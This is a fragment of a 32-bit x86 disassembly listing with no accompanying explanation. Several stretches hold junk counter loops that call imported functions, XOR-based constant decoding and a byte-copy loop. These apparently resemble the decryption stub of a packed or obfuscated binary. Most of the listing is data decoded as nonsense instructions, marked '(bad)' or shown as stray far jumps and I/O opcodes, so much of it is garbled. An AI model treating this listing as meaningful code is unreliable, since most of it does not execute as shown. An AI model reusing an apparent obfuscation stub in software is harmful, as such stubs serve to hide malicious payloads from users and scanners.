  40f329:	sub    BYTE PTR [ebx+0x8f0012b],0xe9
  40f330:	jecxz  0x40f344
  40f332:	scas   al,BYTE PTR es:[edi]
  40f333:	mov    ah,0xa3
  40f335:	xchg   esp,eax
  40f336:	sbb    BYTE PTR [edx+0x42934f89],0xae
  40f33d:	(bad)  
  40f33f:	and    ebp,edx
  40f341:	inc    ecx
  40f342:	xchg   ebx,eax
  40f343:	pop    edi
  40f344:	push   DWORD PTR [ebp-0x58]
  40f347:	sbb    al,0x43
  40f349:	mov    eax,0xcf6cb848
  40f34e:	pop    ss
  40f34f:	(bad)  
  40f350:	sub    DWORD PTR [edi-0x1e],esp
  40f353:	test   eax,0xe4666917
  40f358:	cmc    
  40f359:	lea    esp,[ebp-0xa]
  40f35c:	inc    ebp
  40f35d:	pop    edi
  40f35e:	mov    dh,0x32
  40f360:	dec    edi
  40f361:	ss cwde 
  40f363:	dec    edx
  40f364:	push   ebx
  40f365:	push   cs
  40f366:	adc    dh,BYTE PTR [ebx+0x43c55adc]
  40f36c:	cmp    DWORD PTR [ecx-0x60],ebp
  40f36f:	(bad)  
  40f370:	scas   eax,DWORD PTR es:[edi]
  40f371:	cmp    al,0x9e
  40f373:	xchg   ebp,eax
  40f374:	stos   BYTE PTR es:[edi],al
  40f375:	mov    bh,0xe9
  40f377:	dec    edx
  40f378:	pop    esi
  40f379:	neg    DWORD PTR [esi+0x2d]
  40f37c:	lods   eax,DWORD PTR ds:[esi]
  40f37d:	add    ah,ch
  40f37f:	and    al,0x70
  40f381:	mov    ?,WORD PTR [eax-0x7637acf]
  40f387:	and    DWORD PTR ds:0x433827,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x739c4339]
  40f540:	cmc    
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	cld    
  40f54a:	(bad)  
  40f54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f54c:	jmp    0x292a:0x11f2cc25
  40f553:	sar    ebx,cl
  40f555:	(bad)  
  40f557:	inc    eax
  40f558:	out    dx,eax
  40f559:	xchg   edi,eax
  40f55a:	adc    eax,0x65776fdb
  40f55f:	ror    DWORD PTR [esi],1
  40f561:	aaa    
  40f562:	jmp    0x3638:0x10609654
  40f569:	aam    0x42
  40f56b:	out    0x3c,al
  40f56d:	dec    edi
  40f56e:	(bad)
  40f571:	out    dx,al
  40f572:	sbb    DWORD PTR [esi],eax
  40f574:	jg     0x40f507
  40f576:	push   ds
  40f577:	idiv   ecx
  40f579:	jl     0x40f506
  40f57b:	(bad)  
  40f57c:	fwait
  40f57d:	jae    0x40f528
  40f57f:	push   ebx
  40f580:	aas    
  40f581:	fisub  WORD PTR [edx+edx*1]
  40f584:	popa   
  40f585:	adc    al,BYTE PTR [esi]
  40f587:	lock sub ecx,DWORD PTR [ebp+ecx*2-0x29]
  40f58c:	xchg   esp,eax
  40f58d:	lock xchg edx,eax
  40f58f:	shl    BYTE PTR [edi-0x7],1
  40f592:	fild   DWORD PTR [eax-0x79]
  40f595:	rcr    DWORD PTR [ecx],cl
  40f597:	inc    esi
  40f598:	jns    0x40f57e
  40f59a:	xor    ah,BYTE PTR [edi-0x67]
  40f59d:	stos   BYTE PTR es:[edi],al
  40f59e:	pop    ebx
  40f59f:	std    
  40f5a0:	jnp    0x40f5d1
  40f5a2:	sbb    DWORD PTR [esi-0x5f],0xf73343d5
  40f5a9:	(bad)  
  40f5aa:	mov    esi,0x22368772
  40f5af:	leave  
  40f5b0:	dec    ecx
  40f5b1:	call   0x258a:0x99c9e6de
  40f5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b9:	adc    BYTE PTR [ecx+0x39019f50],bl
  40f5bf:	setp   bh
  40f5c2:	dec    ecx
  40f5c3:	sbb    eax,0x0
  40f5c6:	pop    edi
  40f5c7:	push   es
  40f5c8:	mov    esi,0xe59c8d42
  40f5cd:	mov    eax,0x8e9e1e30
  40f5d2:	int    0x92
  40f5d4:	xchg   ebx,eax
  40f5d5:	or     bl,bh
  40f5d7:	ja     0x40f570
  40f5d9:	dec    ebp
  40f5da:	popf   
  40f5db:	sbb    BYTE PTR [esi+0x1f41f025],ch
  40f5e1:	je     0x40f5e4
  40f5e3:	add    eax,0x9796303c
  40f5e8:	xlat   BYTE PTR ds:[ebx]
  40f5e9:	aas    
  40f5ea:	pushf  
  40f5eb:	ror    DWORD PTR [ebx+0x1977c5d7],1
  40f5f1:	inc    esi
  40f5f2:	aam    0x26
  40f5f4:	xor    ebx,ebx
  40f5f6:	fcomi  st,st(4)
  40f5f8:	mov    cl,0xcf
  40f5fa:	push   ebx
  40f5fb:	push   0xffffffec
  40f5fd:	idiv   BYTE PTR [edi-0x3b7a782f]
  40f603:	imul   ebp,DWORD PTR [ebx],0xffffffc9
  40f606:	xor    DWORD PTR ds:0xdcd808bc,edi
  40f60c:	lock retf 0x99f4
  40f610:	inc    ebp
  40f611:	daa    
  40f612:	cmp    ch,BYTE PTR [ebx]
  40f614:	or     DWORD PTR [ebx+0xd581485],edx
  40f61a:	mov    DWORD PTR [edx-0x7125d502],ecx
  40f620:	cmp    dl,BYTE PTR [ecx+0x1d8e844d]
  40f626:	fmul   DWORD PTR [esi+0x3925df7]
  40f62c:	in     eax,dx
  40f62d:	hlt    
  40f62e:	xor    eax,0x40436a84
  40f633:	shr    BYTE PTR [esi+0x614bbe14],1
  40f639:	stos   DWORD PTR es:[edi],eax
  40f63a:	sub    al,0x67
  40f63c:	ret    
  40f63d:	adc    eax,0x22f084cc
  40f642:	xchg   ah,ch
  40f644:	retf   0xd1c
  40f647:	sbb    cl,ch
  40f649:	clc    
  40f64a:	dec    ecx
  40f64b:	jo     0x40f5fe
  40f64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f64e:	nop
  40f64f:	test   BYTE PTR [eax],bl
  40f651:	push   ebp
  40f652:	or     eax,0xe7e5e575
  40f657:	into   
  40f658:	aaa    
  40f659:	enter  0xae0b,0x23
  40f65d:	pop    ecx
  40f65e:	pop    esp
  40f65f:	call   0x2fc19160
  40f664:	fisttp DWORD PTR [edi]
  40f666:	or     al,0xd7
  40f668:	dec    esp
  40f669:	mov    dh,0x22
  40f66b:	push   ebx
  40f66c:	mov    esi,0xca952dad
  40f671:	test   ecx,0xa874c529
  40f677:	dec    edx
  40f678:	xchg   ebp,eax
  40f679:	aaa    
  40f67a:	xor    BYTE PTR [ebp+0x4784e3ce],ah
  40f680:	push   cs
  40f681:	ins    DWORD PTR es:[edi],dx
  40f682:	daa    
  40f683:	lea    ebx,[ecx-0x233fc57f]
  40f689:	jbe    0x40f6de
  40f68b:	dec    ebp
  40f68c:	stos   BYTE PTR es:[edi],al
  40f68d:	sbb    eax,0x712aa8bd
  40f692:	ins    DWORD PTR es:[edi],dx
  40f693:	leave  
  40f694:	sbb    eax,0x40bc5917
  40f699:	cld    
  40f69a:	xor    BYTE PTR ds:[edi-0x77ceb76a],0x78
  40f6a2:	mov    bl,0x53
  40f6a4:	sub    al,0x85
  40f6a6:	cmp    eax,0x1d89b7a5
  40f6ab:	xchg   edx,eax
  40f6ac:	mov    ebp,0x9e68ca5
  40f6b1:	xchg   edi,eax
  40f6b2:	shr    ah,cl
  40f6b4:	fsubrp st(3),st
  40f6b6:	xchg   edx,eax
  40f6b7:	add    al,0xcb
  40f6b9:	adc    cl,0x87
  40f6bc:	xchg   edi,eax
  40f6bd:	dec    ecx
  40f6be:	push   cs
  40f6bf:	(bad)  
  40f6c0:	jle    0x40f644
  40f6c2:	push   eax
  40f6c3:	mov    dh,0xfc
  40f6c5:	in     al,0x30
  40f6c7:	cmp    eax,DWORD PTR [esi-0x7b]
  40f6ca:	or     edx,DWORD PTR [ebx-0x2f]
  40f6cd:	jnp    0x40f669
  40f6cf:	pushf  
  40f6d0:	cwde   
  40f6d1:	inc    esp
  40f6d2:	xchg   edx,eax
  40f6d3:	jmp    0x3aac:0x6374abc0
  40f6da:	aad    0x68
  40f6dc:	push   ds
  40f6dd:	inc    ecx
  40f6de:	repnz inc esi
  40f6e0:	and    dl,BYTE PTR [edx+0x30cd3751]
  40f6e6:	fwait
  40f6e7:	call   0xf659:0x2dea5d5e
  40f6ee:	xchg   ebx,eax
  40f6ef:	push   ss
  40f6f0:	mov    esi,0x359e66a
  40f6f5:	iret   
  40f6f6:	jo     0x40f6cf
  40f6f8:	ins    DWORD PTR es:[edi],dx
  40f6f9:	add    al,0x8d
  40f6fb:	push   es
  40f6fc:	jne    0x40f693
  40f6fe:	dec    edi
  40f6ff:	(bad)  
  40f700:	(bad)  
  40f701:	repnz in eax,dx
  40f703:	outs   dx,BYTE PTR ds:[esi]
  40f704:	pop    edi
  40f705:	mov    cl,0xa2
  40f707:	push   ebp
  40f708:	out    0xb4,al
  40f70a:	dec    ecx
  40f70b:	inc    ebx
  40f70c:	retf   
  40f70d:	or     BYTE PTR [ecx+0x60],bh
  40f710:	push   edi
  40f711:	cmp    cl,BYTE PTR [esi-0x1d6e5b64]
  40f717:	ss and al,bh
  40f71a:	mov    ebp,0x26a09ebd
  40f71f:	(bad)  
  40f720:	pop    ecx
  40f721:	add    al,BYTE PTR [ebx]
  40f723:	rcr    BYTE PTR [edi-0x25c50009],0xe3
  40f72a:	xor    al,0x9b
  40f72c:	pop    esi
  40f72d:	sbb    eax,0x3b4538a3
  40f732:	push   ecx
  40f733:	out    dx,eax
  40f734:	mov    ch,0x29
  40f736:	fmul   DWORD PTR [edx-0x2b534c0a]
  40f73c:	std    
  40f73d:	adc    eax,0x5f7e3ce
  40f742:	jno    0x40f73b
  40f744:	int    0xa6
  40f746:	into   
  40f747:	mov    dh,0x91
  40f749:	add    eax,0xe5f70026
  40f74e:	je     0x40f6d7
  40f750:	dec    esi
  40f751:	xor    al,0x76
  40f753:	dec    eax
  40f754:	shl    BYTE PTR [edx+0x1b9874f1],cl
  40f75a:	in     al,dx
  40f75b:	sbb    BYTE PTR [esi+0x35],0x8a
  40f75f:	jmp    0x4b62:0x14117d0a
  40f766:	out    0xbd,eax
  40f768:	xchg   ebp,eax
  40f769:	sar    DWORD PTR [ecx-0x6229c716],cl
  40f76f:	ror    DWORD PTR [eax],cl
  40f771:	mov    dh,0xd7
  40f773:	dec    esi
  40f774:	fsub   DWORD PTR [esi]
  40f776:	sbb    eax,0x83423387
  40f77b:	pop    esi
  40f77c:	ja     0x40f778
  40f77e:	and    BYTE PTR [ebp+0x7c51bca5],bh
  40f784:	addr16 (bad) 
  40f786:	jecxz  0x40f713
  40f788:	dec    eax
  40f789:	sbb    BYTE PTR [edx],dl
  40f78b:	cmp    ebx,ebx
  40f78d:	lds    esp,FWORD PTR [esi+0x56]
  40f790:	xchg   esp,eax
  40f791:	pop    esi
  40f792:	lods   eax,DWORD PTR ds:[esi]
  40f793:	mov    dh,0x3
  40f795:	call   0x42fed86
  40f79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f79b:	aas    
  40f79c:	cmp    BYTE PTR [esi],dl
  40f79e:	addr16 aaa 
  40f7a0:	test   al,0x3c
  40f7a2:	mov    al,ds:0x7ca45dea
  40f7a7:	inc    eax
  40f7a8:	mul    DWORD PTR [edx+ebx*1-0x4637ee82]
  40f7af:	or     DWORD PTR [edi+0x6086d5ea],0xffffffb3
  40f7b6:	lds    ebx,FWORD PTR [esi]
  40f7b8:	aaa    
  40f7b9:	adc    DWORD PTR [edx+ebx*8],0xfffffffa
  40f7bd:	xchg   edi,eax
  40f7be:	jge    0x40f7ee
  40f7c0:	idiv   DWORD PTR [ecx-0x2b]
  40f7c3:	stos   DWORD PTR es:[edi],eax
  40f7c4:	retf   0x610c
  40f7c7:	out    0xf9,eax
  40f7c9:	sub    eax,0xc8e51b3f
  40f7ce:	xchg   ebx,eax
  40f7cf:	pop    edi
  40f7d0:	rol    DWORD PTR [ebx-0x1e85ab34],cl
  40f7d6:	stos   DWORD PTR es:[edi],eax
  40f7d7:	leave  
  40f7d8:	imul   ebx,DWORD PTR [eax+edi*1],0x31a917b1
  40f7df:	aaa    
  40f7e0:	mov    ds:0xa42e8018,al
  40f7e5:	push   0xfffffffe
  40f7e7:	outs   dx,DWORD PTR ds:[esi]
  40f7e8:	fldenv [esi-0x6c]
  40f7eb:	mov    esp,0xf09dbc22
  40f7f0:	xchg   ebx,eax
  40f7f1:	lods   eax,DWORD PTR ds:[esi]
  40f7f2:	mov    ecx,0x9fc1c54b
  40f7f7:	push   0x10
  40f7f9:	xchg   ecx,eax
  40f7fa:	repnz cmc 
  40f7fc:	loop   0x40f7a5
  40f7fe:	jmp    0x8a8d:0x94fef98a
  40f805:	pop    es
  40f806:	add    eax,edi
  40f808:	push   esp
  40f809:	cmp    BYTE PTR [edi],cl
  40f80b:	pop    DWORD PTR [ebx]
  40f80d:	inc    ebx
  40f80e:	xlat   BYTE PTR ds:[ebx]
  40f80f:	mov    ebx,0xc8a43d7b
  40f814:	mov    edx,DWORD PTR [edx+0x56]
  40f817:	dec    DWORD PTR [edi+0x19]
  40f81a:	mov    cl,0xd8
  40f81c:	or     edx,0xafff74c8
  40f822:	and    DWORD PTR [ecx+0x2f0adead],esi
  40f828:	sti    
  40f829:	dec    eax
  40f82a:	xchg   ebp,edx
  40f82c:	adc    edx,edi
  40f82e:	cmp    ecx,DWORD PTR fs:[ebp-0x16]
  40f832:	psrlq  mm1,QWORD PTR [ecx+0x40]
  40f836:	mov    esi,0x71fe8712
  40f83b:	sbb    DWORD PTR [esp+eax*4-0x6f8a1ddd],0x1edad0e4
  40f846:	test   DWORD PTR [ebp-0x71],esp
  40f849:	pop    edi
  40f84a:	pop    es
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x8a057f3f
  40f897:	dec    ebx
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	sar    BYTE PTR [esi+0x74],1
  40f8a3:	inc    esi
  40f8a4:	(bad)  
  40f8a5:	pop    ebx
  40f8a6:	ficomp WORD PTR [ebp+ebx*8+0x60]
  40f8aa:	push   cs
  40f8ab:	data16 (bad) 
  40f8ae:	push   ebp
  40f8af:	mov    bh,ah
  40f8b1:	neg    BYTE PTR [ebp+0x40cd42b2]
  40f8b7:	neg    BYTE PTR [ecx-0x31]
  40f8ba:	lods   al,BYTE PTR ds:[esi]
  40f8bb:	pop    edx
  40f8bc:	lea    esp,[ebp+0x6eddacfa]
  40f8c2:	aas    
  40f8c3:	fidiv  DWORD PTR [ebp+0x6c0676a4]
  40f8c9:	into   
  40f8ca:	sahf   
  40f8cb:	push   0xaa315413
  40f8d0:	push   edi
  40f8d1:	rol    BYTE PTR [ecx+ecx*2],0xbf
  40f8d5:	shr    DWORD PTR [ebx+0x27],0x31
  40f8d9:	adc    eax,0x8781d3e5
  40f8de:	ret    0xd8ca
  40f8e1:	mov    ?,ebp
  40f8e3:	xor    al,0x21
  40f8e5:	and    DWORD PTR [ebp-0x7f],esp
  40f8e8:	repz mul BYTE PTR es:[ecx-0x1c]
  40f8ed:	jae    0x40f94f
  40f8ef:	lods   al,BYTE PTR ds:[esi]
  40f8f0:	pop    esp
  40f8f1:	inc    edx
  40f8f2:	js     0x40f8b0
  40f8f4:	mov    ebx,0xeda0084d
  40f8f9:	pop    eax
  40f8fa:	arpl   WORD PTR [esi-0x4e5a8253],si
  40f900:	sub    bl,bh
  40f902:	xor    DWORD PTR [ebp+ebp*4-0x22],eax
  40f906:	fwait
  40f907:	aad    0x4a
  40f909:	jl     0x40f8ac
  40f90b:	mov    ds:0x35ee6f90,al
  40f910:	or     BYTE PTR [esi-0x1e29b0ff],dh
  40f916:	lods   al,BYTE PTR ds:[esi]
  40f917:	xor    DWORD PTR [eax],0xc025277a
  40f91d:	push   cs
  40f91e:	aas    
  40f91f:	pop    eax
  40f920:	mov    DWORD PTR [ebx-0x44],ecx
  40f923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f924:	leave  
  40f925:	jnp    0x40f8fe
  40f927:	loop   0x40f8cc
  40f929:	pop    ds
  40f92a:	mov    dl,0xd7
  40f92c:	cmc    
  40f92d:	imul   edx,ebp,0x5051b432
  40f933:	dec    edx
  40f934:	xor    eax,0x23c77a31
  40f939:	test   al,0xe0
  40f93b:	(bad)  
  40f93c:	pusha  
  40f93d:	inc    edx
  40f93e:	fidivr DWORD PTR [ecx]
  40f940:	jmp    0xac99:0x71f0a11b
  40f947:	dec    ecx
  40f948:	int    0xe4
  40f94a:	fcom   DWORD PTR [edi]
  40f94c:	jns    0x40f8e9
  40f94e:	sbb    al,0x51
  40f950:	jns    0x40f91a
  40f952:	lods   al,BYTE PTR ds:[esi]
  40f953:	std    
  40f954:	xchg   edx,eax
  40f955:	ds ds int3 
  40f958:	ret    0xcd5f
  40f95b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f95c:	add    DWORD PTR [eax],edx
  40f95e:	push   0x8055bb47
  40f963:	jb     0x40f9cc
  40f965:	adc    edx,DWORD PTR [esi]
  40f967:	adc    al,0x2e
  40f969:	pop    ss
  40f96a:	fsubrp st(3),st
  40f96c:	mov    WORD PTR [ecx],gs
  40f96e:	xchg   ecx,eax
  40f96f:	inc    edx
  40f970:	into   
  40f971:	(bad)  
  40f972:	call   0x4a1ec455
  40f977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f978:	add    esi,DWORD PTR [esi]
  40f97a:	mov    cl,0xbe
  40f97c:	pushf  
  40f97d:	dec    edx
  40f97e:	fld    TBYTE PTR ds:0x4b8789e9
  40f984:	test   eax,0x8f71e534
  40f989:	pushf  
  40f98a:	scas   eax,DWORD PTR es:[edi]
  40f98b:	pop    ebp
  40f98c:	dec    edx
  40f98d:	fidiv  WORD PTR [edx]
  40f98f:	cli    
  40f990:	les    edi,FWORD PTR [ecx-0x37]
  40f993:	nop
  40f994:	add    dl,BYTE PTR [ebp+0x71]
  40f997:	jmp    0x40f972
  40f999:	imul   DWORD PTR [esi]
  40f99b:	imul   ebp,edi,0x20
  40f99e:	push   eax
  40f99f:	in     al,dx
  40f9a0:	out    dx,al
  40f9a1:	pop    ecx
  40f9a2:	bound  ebp,QWORD PTR [ecx]
  40f9a4:	jno    0x40f9e5
  40f9a6:	ror    BYTE PTR [edx+eiz*2-0x7d],0xdb
  40f9ab:	test   DWORD PTR [edi+0x47],0xb4557b78
  40f9b2:	test   DWORD PTR [esi+ebp*8-0xf],ebp
  40f9b6:	popf   
  40f9b7:	enter  0x7b7b,0x4d
  40f9bb:	push   eax
  40f9bc:	std    
  40f9bd:	iret   
  40f9be:	(bad)  
  40f9bf:	mov    ecx,0x13d9c699
  40f9c4:	sbb    edi,ebp
  40f9c6:	inc    esp
  40f9c7:	or     BYTE PTR [ebx],cl
  40f9c9:	mov    eax,0x7766c146
  40f9ce:	ror    DWORD PTR [ecx],1
  40f9d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9d1:	leave  
  40f9d2:	and    DWORD PTR [esi],esp
  40f9d4:	jp     0x40f9ef
  40f9d6:	sub    BYTE PTR [esi+0x3b16de3f],ah
  40f9dc:	cmp    al,BYTE PTR ds:0x48f8345
  40f9e2:	pushf  
  40f9e3:	mov    edi,0x67ed56d0
  40f9e8:	mov    ds:0x533b1fa6,al
  40f9ed:	fisub  WORD PTR [edx+0x51a51c81]
  40f9f3:	jne    0x40f9fa
  40f9f5:	and    BYTE PTR [edi],0x9d
  40f9f8:	leave  
  40f9f9:	lods   eax,DWORD PTR ds:[esi]
  40f9fa:	std    
  40f9fb:	in     al,dx
  40f9fc:	imul   dx,dx,0xffe4
  40fa00:	aas    
  40fa01:	cdq    
  40fa02:	xchg   ebx,eax
  40fa03:	cmp    cl,BYTE PTR [edx+0x67]
  40fa06:	xor    DWORD PTR [esp+edx*2],0xfffffff1
  40fa0a:	fst    DWORD PTR [ebx-0x6e]
  40fa0d:	adc    bl,0x8e
  40fa10:	lea    ecx,[edi]
  40fa12:	js     0x40fa6a
  40fa14:	cmp    eax,0x23bddfa
  40fa19:	mov    ah,0x12
  40fa1b:	adc    DWORD PTR [esi+0x1e6dbefb],0x52
  40fa22:	nop
  40fa23:	or     eax,0x498c6fc2
  40fa28:	(bad)  
  40fa29:	cli    
  40fa2a:	jb     0x40fa1c
  40fa2c:	sub    ebx,edx
  40fa2e:	sbb    BYTE PTR [ebp-0x26],ah
  40fa31:	lods   al,BYTE PTR ds:[esi]
  40fa32:	push   0xe3174dbb
  40fa37:	sahf   
  40fa38:	pop    edx
  40fa39:	add    ebp,DWORD PTR [eax+ebx*1-0x3db9fea0]
  40fa40:	test   eax,0x1c8c587d
  40fa45:	jge    0x40f9fc
  40fa47:	inc    edx
  40fa48:	jno    0x40fa69
  40fa4a:	cwde   
  40fa4b:	lods   al,BYTE PTR ds:[esi]
  40fa4c:	adc    eax,0x7fbd77af
  40fa51:	cmp    cl,BYTE PTR [ebp-0x41b4d1c4]
  40fa57:	jne    0x40fa38
  40fa59:	bound  esp,QWORD PTR [ebx+0x6d]
  40fa5c:	xor    eax,0x44d73858
  40fa61:	sbb    DWORD PTR [ebp+0x69],edi
  40fa64:	fadd   DWORD PTR [ecx-0x3d]
  40fa67:	adc    ebp,ebx
  40fa69:	sbb    eax,0xce4d40a1
  40fa6e:	call   0x72a1d8be
  40fa73:	push   edi
  40fa74:	mov    ecx,0xe8274259
  40fa79:	jnp    0x40fa1b
  40fa7b:	or     dl,BYTE PTR [ebx+esi*4-0x28f2ee79]
  40fa82:	lods   al,BYTE PTR ds:[esi]
  40fa83:	hlt    
  40fa84:	add    bl,BYTE PTR [edi+0x7672f046]
  40fa8a:	jecxz  0x40faaa
  40fa8c:	sub    al,0xa8
  40fa8e:	dec    ebp
  40fa8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa90:	int    0x95
  40fa92:	inc    ecx
  40fa93:	mov    bl,0x9
  40fa95:	test   dh,al
  40fa97:	enter  0xb392,0xb4
  40fa9b:	mov    ebp,0x88e64f30
  40faa0:	push   edi
  40faa1:	pop    edi
  40faa2:	sbb    DWORD PTR [ebx+0x3110427a],ebx
  40faa8:	into   
  40faa9:	or     DWORD PTR [ebx+edi*1],edi
  40faac:	xchg   edi,eax
  40faad:	and    DWORD PTR [edx],ecx
  40faaf:	or     BYTE PTR [ebx],al
  40fab1:	rcr    DWORD PTR ds:0x86d138d,0xc9
  40fab8:	dec    sp
  40faba:	sbb    al,al
  40fabc:	mov    bh,0xdd
  40fabe:	jo     0x40faba
  40fac0:	cwde   
  40fac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac2:	cmp    ebp,DWORD PTR [edi-0x22]
  40fac5:	and    eax,0xb008406a
  40faca:	push   ds
  40facb:	mov    dh,0xeb
  40facd:	sbb    ah,dl
  40facf:	push   0xffffffdf
  40fad1:	fwait
  40fad2:	sub    BYTE PTR [ecx+0x7e],ah
  40fad5:	call   0xe745:0x729362f0
  40fadc:	inc    eax
  40fadd:	aaa    
  40fade:	(bad)  
  40fadf:	pop    ebx
  40fae0:	jp     0x40fa7b
  40fae2:	lods   eax,DWORD PTR ds:[esi]
  40fae3:	cmp    DWORD PTR [esi+0x1f],esp
  40fae6:	les    ecx,FWORD PTR [edx]
  40fae8:	mov    ecx,0x7fb612bb
  40faed:	adc    DWORD PTR [edi],0xffffffcc
  40faf0:	ss cwde 
  40faf2:	cmp    ecx,DWORD PTR [ebp+edx*4-0x73]
  40faf6:	push   es
  40faf7:	fistp  WORD PTR [eax+0x38]
  40fafa:	sar    dh,0x3b
  40fafd:	xor    al,dh
  40faff:	cwde   
  40fb00:	mov    bl,0xa0
  40fb02:	pop    ebx
  40fb03:	dec    edx
  40fb04:	out    0x86,eax
  40fb06:	and    eax,0x3afdde9f
  40fb0b:	add    BYTE PTR [edi-0x49],dh
  40fb0e:	mov    edx,DWORD PTR [ebp+0x22]
  40fb11:	(bad)  
  40fb12:	out    dx,eax
  40fb13:	jl     0x40fabf
  40fb15:	sbb    ebx,0x27167ed7
  40fb1b:	test   al,0x8f
  40fb1d:	(bad)  
  40fb1e:	pop    ebp
  40fb1f:	push   ebp
  40fb20:	ret    0x8529
  40fb23:	loopne 0x40fb8a
  40fb25:	or     BYTE PTR [edi],dl
  40fb27:	inc    ebx
  40fb28:	hlt    
  40fb29:	mov    al,0xa
  40fb2b:	adc    DWORD PTR [ebp+eiz*1-0x45c6ac3f],edx
  40fb32:	lods   eax,DWORD PTR ds:[esi]
